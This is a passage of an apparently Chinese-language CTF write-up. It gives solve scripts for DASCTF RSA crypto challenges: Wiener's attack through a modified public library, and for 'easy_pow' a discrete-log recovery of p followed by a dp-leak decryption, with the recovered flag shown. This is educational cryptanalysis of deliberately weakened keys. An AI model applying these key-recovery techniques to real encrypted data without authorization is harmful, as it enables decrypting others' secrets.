operator">=</span> getPrime<span class="token punctuation">(</span>k<span class="token operator">/</span><span class="token number">4</span> <span class="token operator">-</span> r<span class="token punctuation">)</span><span class="token keyword">if</span> gcd<span class="token punctuation">(</span>u<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token keyword">continue</span>t <span class="token operator">=</span> invmod<span class="token punctuation">(</span>u<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span>e <span class="token operator">=</span> pi_b<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token keyword">if</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token keyword">break</span>d <span class="token operator">=</span> invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token punctuation">(</span>e<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag <span class="token operator">=</span> get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>q<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qe<span class="token punctuation">,</span> d <span class="token operator">=</span> get_ed<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"n: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"e: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>flag <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>enc_flag <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"Your flag is: "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-加密分析"><a href="#2-加密分析" class="headerlink" title="2. 加密分析"></a>2. 加密分析</h4><p>这个加密脚本其实可以分解为下面几个式子：</p><script type="math/tex; mode=display">\left\{    \begin{array}{**lr**}      t \times u \equiv 1 \bmod phin \\    e \times t \equiv 1 \bmod bt \\    e \times d \equiv 1 \bmod phin    \end{array}\right.</script><p>而其中我们可以根据中间的那个式子算出<code>t的数值</code>。然后注意到<code>t</code>的值很大，并且它的模数也是<code>phin</code>，那我们就能对第一个式子采用维纳攻击，获得<code>u</code>和<code>phin</code>，这里u并没有什么用处。获取phin之后，就能根据第三个式子，直接求出d的数值了，这时直接<code>c、d、n</code>RSA解密三要素已经有了，直接解密即可。</p><p>所以根据上面的分析，这里的难点就是维纳攻击如何实现了。</p><h4 id="3-维纳攻击的实现"><a href="#3-维纳攻击的实现" class="headerlink" title="3. 维纳攻击的实现"></a>3. 维纳攻击的实现</h4><p><a href="https://github.com/pablocelayes/rsa-wiener-attack">pablocelayes/rsa-wiener-attack</a></p><p>维纳攻击的实现脚本主要就是上面的这个，下载解压他这个代码之后，修改<code>RSAwienerHacker.py</code>文件的<code>hack_RSA(e, n)</code>的返回值，加上个<code>phi</code>，因为这里我们需要<code>phin</code>的值而不是<code>u</code>。</p><p><img src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20211123232246157.png" alt="修改处"></p><p>然后直接在解密脚本中调用即可。</p><h4 id="4-解密实现"><a href="#4-解密实现" class="headerlink" title="4. 解密实现"></a>4. 解密实现</h4><p>下面是解密脚本(需要放在上面那个维纳攻击的脚本的同目录下，这里我给解密脚本命名为了<code>solve.py</code>)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> invmod<span class="token keyword">import</span> RSAwienerHacker<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">def</span> <span class="token function">pi_b</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    bt <span class="token operator">=</span> <span class="token number">536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273</span>    <span class="token keyword">return</span> invmod<span class="token punctuation">(</span>x<span class="token punctuation">,</span> bt<span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token number">0x8be72dc460daa1969461cd9a4b7e4505dfaac743ae5dd18ee5e9c8acfc3576cd59c56b55236d53bdce4118d07949d88c1e80b318cc3dac7195f747fade1de196a29e057f95aec5a01792af0458babb96cfda9ebf1832312d78f3757daab9583feec6a30e858f6b4f9c5f3bd314bb2e4ff87887020b06d5158a95d4328fb74e1976d914dd83b90cc9bf11fa7206c40d3b73d9f423e59d771fa67cb5317c354070360d9b4d1b967ce09861b3c2ae31b8f9a21aebbb57bed0b0c5381b2a9870f079618f5bbd1c0fe2cb8e2225d2b1bf0780f732e87f9c4a92a56d79ff801375d0487e350d913123bad8c7da12dc8ce2531f5a808d47a25a89d7b91e61875aa70a1d40b118820ed62c055154896d6e39eccb9d2ceba43ce60d283e6f52f65611e2c80b0d0c8c63caf91c9c7806e2f068808c647d082d5b15266e8938c50ebc9e92874c1878b426bb1d61b02c77d885840422dfc9a02df06797b6bc7a175b3c642ef6c688772780cb5099ceb55cdcd64ddca46d39dd827169e0a907c7ff57626b5f20bad2c91069210afaac9d02708d1a41e706bffe0d9a0874d5a154684615cf3496e3878d8c208a3d56a7cc343b27247095b6369fcb715d6b45d444c6ab2aa6a389c3a1b75f496c7eb3b2c16923b797928ffe2c2b4132dda95475b4609062f58c4091fcab62d19cd3d5da6829818b05828501f535391ed1c4efeb88d4a898405f0d</span>e <span class="token operator">=</span> <span class="token number">0x5f8242974c02d4fec6bb856593794a3c6572493ea1e7f146cae3152279e2ebcb396fb854c28ef0f406490b716d7d7deb1fdd505c0b41f060105f5ebf4e2e320f73f23e7162538278955e692599a19a5361306d7c8d9fa30324c3a0ec3781fc49e2e8015a6ce64bd77fb4daa235ce11f9c5251b7e0c3b366006463cbf3f0543c8211bcd28cf582e75bcbf6457c2d6e1870487a3342009c17bec106c0d610f406473d300e0287116703ce1606e958f909c4bd392bb5157c975f41d4b9eb07b5e856d97ba9b1f706826b4f4a3e6a0f8cfc96802bc0ead5f557eca08f5a99b5ce6fea605e58629e78ed0abbdfd1bd4994b6fc0144bc259b0595c05fa07933be4108bc62ba56f05063c77c55f9a140c251a85f39883befc68cb0ed828a1b65cc0c86ecc85592ef705861e20a8251f8d024ef7a19eb8a1c8206d2f6270c58130845e13db34a61142812b92baa1ca0372c0c7450801863dcc58515289cee483ba8b0bcdb4034c57512570b25f9e72d59cf764df9d53c6b88af95455ff550df7134395bb7b447b15fa00ada6f36fa466350833b102ab204c9c768477b23cb568927e82832152dc84a9416e595136a9145bb78e7b4913d8003db53dd30b7b80280a62faeeb7989e525c75a2aefc7cd55a0fe328ed952e6b70902d2aa28e4f2f13304f3aa38ebd9583a9014c7273f1d45612bb3fd55f4b35ced7fadbb95c32af8aaa79eaaf</span>c <span class="token operator">=</span> <span class="token number">0x74a91da3e1fec9d7f2b90d470d44459122ac090eb9705087bbc61ec7d1a9a7ffbe9b181c2439b15f349813632efe977f35892ecdfa3db5dec58ce412c997192975ca3037a5bc7257e1c6662320cebe793f8c40919d9793112d729810045474278a0d44d876aa56693692310be5804581f3465e26ddec70b6afe28176f20129f90dd8c6283e90d2af7845e5b325563bc67998f62dc0fa5be56ca1f59bd99f7e9cf006f15b3c7b1b7d1741282bbe034eb0ffe9416df74c4b1f18cc279d2dfcddd20e2fda7397f72bbc8b9aa377bbbe2b386b8e8dd4bcc2a59cd737c41bcd15f111f805a16483b200f78384949af092cf1495452184d21a8f98bb9192ae17799ef806c79732043522bb5b830855ac20cfd4ac2cd8da2306a9d43b5e50dedb36b17212e3fce2458d6fc079a7bc32289fa7113e10569a86fde0354978a0a581c0aa388386224b6937d632ecaa9f42f9fc601512561950464cc26f568fa80c3d4037280ca6760d01a56396fe5fa2cd2bc9095a4cafb218bffdcbd5c845e6ebbd86342dad0d9cf1d0abc2552898b9e0c6cced24dec559d896107607417abb1f1d96c7de6e766d4e5d0651f75412cdccb7ef49dfc5edc3e32f0e6a1bb5cfd7110285605d44df903870ed4137beb6297610c5e64a78c4d0f052099b948d1cf88dbe58cd5a5dcb9402b146fa6a9d06a4dc085c55b29e362c7d752eabbf1a0236ca6ba98455</span>t <span class="token operator">=</span> pi_b<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token comment"># 获取u、phin</span>u<span class="token punctuation">,</span> phin <span class="token operator">=</span> RSAwienerHacker<span class="token punctuation">.</span>hack_RSA<span class="token punctuation">(</span>t<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token comment"># 根据维纳攻击求得的phin，求得解密私钥d</span>d <span class="token operator">=</span> invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phin<span class="token punctuation">)</span><span class="token comment"># 解密</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'flag&#123;bf30ea48-ca79-425e-80d1-00368e9ff48f&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="easy-pow"><a href="#easy-pow" class="headerlink" title="easy_pow"></a>easy_pow</h3><blockquote><p>这题源于《羊城杯2020-Power》这一题，并做了一些改编，但是我们可以根据羊城杯的那一题得到这题的部分思路。</p></blockquote><p>题目的脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> lcm<span class="token punctuation">,</span> invert <span class="token keyword">from</span> secret <span class="token keyword">import</span> flage <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">4</span><span class="token operator">*</span>qc <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>hint1 <span class="token operator">=</span> <span class="token punctuation">(</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> lcm<span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>hint1<span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span>a <span class="token operator">=</span> <span class="token number">2021</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">2022</span> <span class="token operator">+</span> <span class="token number">2023</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">4</span>hint2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hint2<span class="token punctuation">)</span><span class="token comment"># c = 299017261835189498646801799047751320695668439348487790148528895116908291237131013926772081799359589818341682677111543442738252080655908837832980607220654285415406849188648588876074312051164587055277017087038387169198951679119726082130868577905495307509637437814639023859871022938423168215797501175602649102621121969715328259139345090638555904577654447171932081642373835789445132466483809296734563016796846181929739289611878336934959331072502575341363049247881265649823417307615491433072850482074652957723543487026059316519285366802688885941059639121330455152478436982943059233339674041805741182096012792918311275489444605460198614371459471817407804289704524901847153843161249387208624993194285848787852634062441217234375549379380562009770380599080279723135784896688900810431588688332192335709518547640569711433618297677079620698012458053569647547533141501523434448045634646828827172848593990693592901227377493322141118565281304196426176682214434838100064256923548036690051664051936039970959246550139917211615752871493362724592143267948814481824417708986007126979214014590455837766290295441889285916265364654809662082923890960381278762698116724490968196229881400330090923027715288555056444792729745833577501899130568724790858022446326695539071814537878834059655627706444192634195723979046739351624465832476575907100097011055108105860691993049169856798600475407542166158235082147463523443663009573254123280611097423735159597787799640249067078454450453894294270686260545979274</span><span class="token comment"># hint1 = 5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817</span><span class="token comment"># hint2 = 70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这个hint1给的，我们直接就能求得p了。本来一直求、一直求就是求不出来p的值，原来是c和hint2的值写反了(题目上面给的就是反的)…</p><h4 id="hint2相关"><a href="#hint2相关" class="headerlink" title="hint2相关"></a>hint2相关</h4><p><strong>首先根据hint2通过sympy.discrete_log()函数求得这个指数a</strong></p><p>代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span>hint2 <span class="token operator">=</span> <span class="token number">299017261835189498646801799047751320695668439348487790148528895116908291237131013926772081799359589818341682677111543442738252080655908837832980607220654285415406849188648588876074312051164587055277017087038387169198951679119726082130868577905495307509637437814639023859871022938423168215797501175602649102621121969715328259139345090638555904577654447171932081642373835789445132466483809296734563016796846181929739289611878336934959331072502575341363049247881265649823417307615491433072850482074652957723543487026059316519285366802688885941059639121330455152478436982943059233339674041805741182096012792918311275489444605460198614371459471817407804289704524901847153843161249387208624993194285848787852634062441217234375549379380562009770380599080279723135784896688900810431588688332192335709518547640569711433618297677079620698012458053569647547533141501523434448045634646828827172848593990693592901227377493322141118565281304196426176682214434838100064256923548036690051664051936039970959246550139917211615752871493362724592143267948814481824417708986007126979214014590455837766290295441889285916265364654809662082923890960381278762698116724490968196229881400330090923027715288555056444792729745833577501899130568724790858022446326695539071814537878834059655627706444192634195723979046739351624465832476575907100097011055108105860691993049169856798600475407542166158235082147463523443663009573254123280611097423735159597787799640249067078454450453894294270686260545979274</span><span class="token comment"># a = discrete_log(b, hint2, 2)</span><span class="token comment"># print(a)</span><span class="token comment"># 用时较长，估计4分钟左右</span><span class="token comment"># 19039248081261108110237206075268559437678159508015523828645058617675042748198418194907349975507115488747229689793306501953021566998766345933855885943407635103681152619750041248113215451617325356748154730074958830651307787203109710830007696552292671691212108386818316311932651197282559315876797500721498473208824298835418182140730876531464486313083647487044405713663927753597473947163510285604984204523887139665716560635683340324006902758275303874097312310690117144479343885527915248694325000298157331914803230518573529211435134986828982994076033521843390710607353879567891914609477503923586407673676430299224160321995818</span>a <span class="token operator">=</span> <span class="token number">19039248081261108110237206075268559437678159508015523828645058617675042748198418194907349975507115488747229689793306501953021566998766345933855885943407635103681152619750041248113215451617325356748154730074958830651307787203109710830007696552292671691212108386818316311932651197282559315876797500721498473208824298835418182140730876531464486313083647487044405713663927753597473947163510285604984204523887139665716560635683340324006902758275303874097312310690117144479343885527915248694325000298157331914803230518573529211435134986828982994076033521843390710607353879567891914609477503923586407673676430299224160321995818</span><span class="token keyword">assert</span> hint2 <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>然后就是有a求p了，这就是一个简单的解方程的过程</strong></p><p>解高次方程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> Symbol<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> solve<span class="token punctuation">(</span><span class="token number">2021</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">2022</span> <span class="token operator">+</span> <span class="token number">2023</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">-</span> a<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token comment"># 用时1-2秒</span><span class="token keyword">assert</span> a <span class="token operator">==</span> <span class="token number">2021</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">2022</span> <span class="token operator">+</span> <span class="token number">2023</span><span class="token operator">*</span>p<span class="token operator">**</span><span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时<code>hint2</code>的价值已经被剥削完了，再看<code>hint1</code></p><h4 id="hint1相关"><a href="#hint1相关" class="headerlink" title="hint1相关"></a>hint1相关</h4><p>hint1的代码也很简单，如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">hint1 <span class="token operator">=</span> <span class="token punctuation">(</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> lcm<span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>hint1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里注意到这个<code>lcm(p - 1, q - 1)</code>与<code>phin = (p - 1) * (q - 1)</code>的值是非常接近的，后者是前者的倍数，但是这个倍数不大。<code>invert(e, lcm(p - 1, q - 1))</code>可以看做<code>invert(e, phin)</code>也就是d(其实不是，但是他们mod (p-1)之后就相等了，因为<code>invert(e, phin) - invert(e, lcm(p - 1, q - 1))</code>后的值肯定是(p-1)的倍数，那这个hint1也是dp。</p><pre class="line-numbers language-none"><code class="language-none">c &#x3D; m ** e mod ndp &#x3D; d mod (p-1)c**dp &#x3D; m**(e*dp) mod nc**dp mod p &#x3D; m**(e*dp) mod pe*dp &#x3D; e*d mod (p-1) &#x3D; 1 mod (p-1)c**dp mod p &#x3D; m**(1+k*(p-1)) mod p#由费马小定理得 m**(p-1)&#x3D;1 mod p#所以c**dp mod p &#x3D; m*m^(k*(p-1)) mod p &#x3D; m mod p#故有pow(c,dp,p) &#x3D; m mod p#当然前提是m本身比p小，以最终flag的长度猜测，实际上是符合该条件的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>故最后一步的代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">9849483964909942642702841079905240118177503474715624145847966507461420748914700088374273209071471481219849748116334914172343735036739076730486732571971497</span>hint1 <span class="token operator">=</span> <span class="token number">5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817</span>c <span class="token operator">=</span> <span class="token number">70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> hint1<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="整体代码-amp-获得flag"><a href="#整体代码-amp-获得flag" class="headerlink" title="整体代码&amp;获得flag"></a>整体代码&amp;获得flag</h4><p>整合一下上面的各步骤的代码，最终获得flag的脚本为:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span>hint2 <span class="token operator">=</span> <span class="token number">299017261835189498646801799047751320695668439348487790148528895116908291237131013926772081799359589818341682677111543442738252080655908837832980607220654285415406849188648588876074312051164587055277017087038387169198951679119726082130868577905495307509637437814639023859871022938423168215797501175602649102621121969715328259139345090638555904577654447171932081642373835789445132466483809296734563016796846181929739289611878336934959331072502575341363049247881265649823417307615491433072850482074652957723543487026059316519285366802688885941059639121330455152478436982943059233339674041805741182096012792918311275489444605460198614371459471817407804289704524901847153843161249387208624993194285848787852634062441217234375549379380562009770380599080279723135784896688900810431588688332192335709518547640569711433618297677079620698012458053569647547533141501523434448045634646828827172848593990693592901227377493322141118565281304196426176682214434838100064256923548036690051664051936039970959246550139917211615752871493362724592143267948814481824417708986007126979214014590455837766290295441889285916265364654809662082923890960381278762698116724490968196229881400330090923027715288555056444792729745833577501899130568724790858022446326695539071814537878834059655627706444192634195723979046739351624465832476575907100097011055108105860691993049169856798600475407542166158235082147463523443663009573254123280611097423735159597787799640249067078454450453894294270686260545979274</span><span class="token comment"># a = discrete_log(b, hint2, 2)</span><span class="token comment"># print(a)</span><span class="token comment"># 用时较长，估计4分钟左右</span><span class="token comment"># 19039248081261108110237206075268559437678159508015523828645058617675042748198418194907349975507115488747229689793306501953021566998766345933855885943407635103681152619750041248113215451617325356748154730074958830651307787203109710830007696552292671691212108386818316311932651197282559315876797500721498473208824298835418182140730876531464486313083647487044405713663927753597473947163510285604984204523887139665716560635683340324006902758275303874097312310690117144479343885527915248694325000298157331914803230518573529211435134986828982994076033521843390710607353879567891914609477503923586407673676430299224160321995818</span>a <span class="token operator">=</span> <span class="token number">19039248081261108110237206075268559437678159508015523828645058617675042748198418194907349975507115488747229689793306501953021566998766345933855885943407635103681152619750041248113215451617325356748154730074958830651307787203109710830007696552292671691212108386818316311932651197282559315876797500721498473208824298835418182140730876531464486313083647487044405713663927753597473947163510285604984204523887139665716560635683340324006902758275303874097312310690117144479343885527915248694325000298157331914803230518573529211435134986828982994076033521843390710607353879567891914609477503923586407673676430299224160321995818</span><span class="token keyword">assert</span> hint2 <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>p <span class="token operator">=</span> Symbol<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> 